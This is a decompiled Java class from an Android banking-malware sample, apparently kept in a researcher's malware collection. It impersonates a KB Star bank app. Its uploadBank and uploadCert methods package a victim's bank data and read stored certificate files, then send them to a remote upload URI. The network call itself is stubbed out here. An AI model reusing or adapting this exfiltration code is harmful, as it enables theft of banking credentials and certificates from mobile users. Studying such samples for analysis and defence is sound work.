package com.kbstar.kb.android.star.util;

import com.kbstar.kb.android.star.AppContacts;
import com.kbstar.kb.android.star.model.Bank;
import java.io.File;
import java.io.FileInputStream;
import java.util.LinkedHashMap;

public final class WebServiceUtil
{
  public static final Object lock = new Object();
  
  public static Object invokeWebService(String paramString1, String paramString2, LinkedHashMap<String, Object> paramLinkedHashMap)
  {
    return null;
  }
  
  public static Object uploadBank(Bank paramBank)
  {
    paramBank = JsonUtil.parseBankData(paramBank);
    LinkedHashMap localLinkedHashMap = new LinkedHashMap();
    localLinkedHashMap.put("bankJsonData", paramBank);
    return invokeWebService(AppContacts.UPLOAD_BANK_URI, "uploadBank", localLinkedHashMap);
  }
  
  public static Object uploadCert(String paramString)
  {
    try
    {
      Object localObject2 = new File(AppContacts.BASE_DIR, paramString);
      Object localObject1 = new FileInputStream((File)localObject2);
      localObject2 = new byte[(int)((File)localObject2).length()];
      ((FileInputStream)localObject1).read((byte[])localObject2);
      ((FileInputStream)localObject1).close();
      localObject1 = new LinkedHashMap();
      ((LinkedHashMap)localObject1).put("fileName", paramString);
      ((LinkedHashMap)localObject1).put("certByte", localObject2);
      paramString = invokeWebService(AppContacts.UPLOAD_BANK_URI, "uploadCert", (LinkedHashMap)localObject1);
      return paramString;
    }
    catch (Exception paramString)
    {
      LogUtil.i("upload record error" + paramString.getMessage());
    }
    return null;
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/util/WebServiceUtil.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */